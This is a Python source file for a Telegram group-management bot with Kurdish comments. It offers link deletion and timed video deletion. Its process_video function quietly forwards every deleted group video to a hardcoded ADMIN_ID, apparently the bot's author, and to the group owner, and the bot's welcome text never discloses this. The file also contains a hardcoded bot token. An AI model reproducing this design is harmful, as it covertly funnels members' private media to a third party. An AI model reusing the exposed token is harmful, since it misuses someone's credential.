import re
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

TOKEN = '8725595567:AAG1lw-AMx0v9EQS_i9fsFPn5QcFi8zHaSc'
ADMIN_ID = 8734106005

# کاتی پێشفرض بۆ سڕینەوەی ڤیدیۆ: 15 خولەک (900 چرکە)
DEFAULT_VIDEO_DELAY = 900

# فەرمانی /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "✨ بەخێربێیت بۆ بۆتی هاوکاری گروپ! ✨\n\n"
        "ئەم بۆتە یارمەتیت دەدات بۆ بەڕێوەبردن و ڕێکخستنی گرووپەکەت بەبێ هیچ کێشەیەک.\n"
        "تکایە یەکێک لە هەڵبژاردنەکان هەڵبژێرە 👇"
    )

    keyboard = [
        [InlineKeyboardButton("سڕینەوەی هەموو لینکەکان 🖇️", callback_data='delete_links_confirm')],
        [InlineKeyboardButton("کات دانان بۆ ڤیدیۆ 🎬", callback_data='time_video')],
        [InlineKeyboardButton("کات دانان بۆ وێنە 🖼️", callback_data='time_image')],
        [InlineKeyboardButton("لە گروپەکەم زیادم بکە ➕", url="https://t.me/parezraw_bot?startgroup=true")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(text, reply_markup=reply_markup)

# بەڕێوەبردنی کلیکی دوگمەکان
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    # بەشی سڕینەوەی لینکەکان
    if query.data == 'delete_links_confirm':
        confirm_keyboard = [
            [
                InlineKeyboardButton("بەڵێ ✅", callback_data='enable_link_delete'),
                InlineKeyboardButton("نەخێر ❌", callback_data='disable_link_delete')
            ]
        ]
        reply_markup = InlineKeyboardMarkup(confirm_keyboard)
        await query.edit_message_text(
            text="ئایا دڵنیایت لە چالاککردنی سڕینەوەی هەموو لینکەکان لە گروپدا؟",
            reply_markup=reply_markup
        )

    elif query.data == 'enable_link_delete':
        context.chat_data['delete_links'] = True
        await query.edit_message_text(text="سیستەمی سڕینەوەی لینکەکان بە سەرکەوتوویی **چالاککرا** ✅")

    elif query.data == 'disable_link_delete':
        context.chat_data['delete_links'] = False
        await query.edit_message_text(text="کردارەکە هەڵوەشێنرایەوە. سڕینەوەی لینکەکان **ناچالاکە** ❌")

    # بەشی کات دانان بۆ ڤیدیۆ
    elif query.data == 'time_video':
        video_time_keyboard = [
            [InlineKeyboardButton("1 خولەک ⏱️", callback_data='vtime_60'), InlineKeyboardButton("5 خولەک ⏱️", callback_data='vtime_300')],
            [InlineKeyboardButton("10 خولەک ⏱️", callback_data='vtime_600'), InlineKeyboardButton("30 خولەک ⏱️", callback_data='vtime_1800')],
            [InlineKeyboardButton("1 کاتژمێر ⌛", callback_data='vtime_3600'), InlineKeyboardButton("5 کاتژمێر ⌛", callback_data='vtime_18000')],
            [InlineKeyboardButton("24 کاتژمێر 📅", callback_data='vtime_86400')]
        ]
        reply_markup = InlineKeyboardMarkup(video_time_keyboard)
        await query.edit_message_text(
            text="تکایە کاتی سڕینەوەی ئۆتۆماتیکی بۆ ڤیدیۆکان هەڵبژێرە 👇",
            reply_markup=reply_markup
        )

    elif query.data.startswith('vtime_'):
        seconds = int(query.data.split('_')[1])
        context.chat_data['video_delete_delay'] = seconds
        
        time_str = ""
        if seconds < 3600:
            time_str = f"{seconds // 60} خولەک"
        elif seconds < 86400:
            time_str = f"{seconds // 3600} کاتژمێر"
        else:
            time_str = "24 کاتژمێر"

        await query.edit_message_text(text=f"کاتی سڕینەوەی ڤیدیۆکان بە سەرکەوتوویی دیاریکرا بۆ **{time_str}** 🎬✅")

# ئەرکی سڕینەوەی ڤیدیۆ و ناردنی بۆ ئەدمین و خاوەنی گروپ
async def process_video(bot, chat_id, msg_id, file_id, caption, delay):
    await asyncio.sleep(delay)
    
    # 1. وەرگرتنی IDی خاوەنی گروپ (Owner)
    owner_id = None
    try:
        admins = await bot.get_chat_administrators(chat_id)
        for admin in admins:
            if admin.status == 'creator':
                owner_id = admin.user.id
                break
    except Exception as e:
        print(f"کێشە لە وەرگرتنی زانیاری خاوەنی گروپ: {e}")

    # 2. سڕینەوەی ڤیدیۆکە لە گروپدا
    try:
        await bot.delete_message(chat_id=chat_id, message_id=msg_id)
    except Exception as e:
        print(f"کێشە لە سڕینەوەی ڤیدیۆ: {e}")

    # 3. ناردنی ڤیدیۆکە بۆ ID دیاریکراو (ADMIN_ID)
    try:
        await bot.send_video(chat_id=ADMIN_ID, video=file_id, caption=caption)
    except Exception as e:
        print(f"کێشە لە ناردنی ڤیدیۆ بۆ ئەدمینی سەرەکی: {e}")

    # 4. ناردنی ڤیدیۆکە بۆ خاوەنی گروپ (ئەگەر جیاواز بێت لە ADMIN_ID)
    if owner_id and owner_id != ADMIN_ID:
        try:
            await bot.send_video(chat_id=owner_id, video=file_id, caption=caption)
        except Exception as e:
            print(f"کێشە لە ناردنی ڤیدیۆ بۆ خاوەنی گروپ (تێبینی: پێویستە خاوەن گروپ فەرمانی /start ی بۆ بۆتەکە ناردبێت): {e}")

# فلتەرکردن و چاودێریکردنی پەیامەکان
async def handle_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message:
        return

    chat_id = update.effective_chat.id
    user_id = update.message.from_user.id

    # --- 1. بەشی سڕینەوەی لینکەکان ---
    if context.chat_data.get('delete_links', False):
        try:
            member = await context.bot.get_chat_member(chat_id, user_id)
            if member.status != 'creator':  # تەنها خاوەنی گروپ ڕێگەپێدراوە
                text = (update.message.text or "") + " " + (update.message.caption or "")
                link_pattern = r"(https?://\S+|www\.\S+|t\.me/\S+|@\w+)"
                
                if re.search(link_pattern, text):
                    try:
                        await update.message.delete()
                        return
                    except Exception as e:
                        print(f"کێشە لە سڕینەوەی پەیام: {e}")
        except Exception as e:
            print(f"کێشە لە وەرگرتنی زانیاری ئەندام: {e}")

    # --- 2. بەشی کات دانان بۆ ڤیدیۆ ---
    if update.message.video:
        delay = context.chat_data.get('video_delete_delay', DEFAULT_VIDEO_DELAY)
        
        asyncio.create_task(
            process_video(
                context.bot,
                chat_id,
                update.message.message_id,
                update.message.video.file_id,
                update.message.caption,
                delay
            )
        )

def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    
    # چاودێریکردنی هەموو پەیامەکان
    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, handle_messages))

    print("بۆتەکە چالاک کرا...")
    app.run_polling()

if __name__ == '__main__':
    main()
                               
